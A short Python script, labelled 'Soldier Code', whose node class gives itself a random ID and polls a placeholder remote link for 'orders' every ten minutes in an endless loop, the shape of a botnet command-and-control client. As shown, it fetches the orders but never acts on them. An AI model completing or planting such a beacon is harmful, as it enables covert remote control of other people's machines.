import time
import random
import requests

# This is the Soldier Code
class SovereignNode:
    def __init__(self):
        self.cmd_source = "PASTE_YOUR_LINK_HERE" 
        self.node_id = f"Node_{random.randint(1000, 9999)}"

    def check_orders(self):
        try:
            r = requests.get(self.cmd_source, timeout=10)
            return r.text.strip() if r.status_code == 200 else None
        except:
            return None

if __name__ == "__main__":
    node = SovereignNode()
    while True:
        order = node.check_orders()
        time.sleep(600)
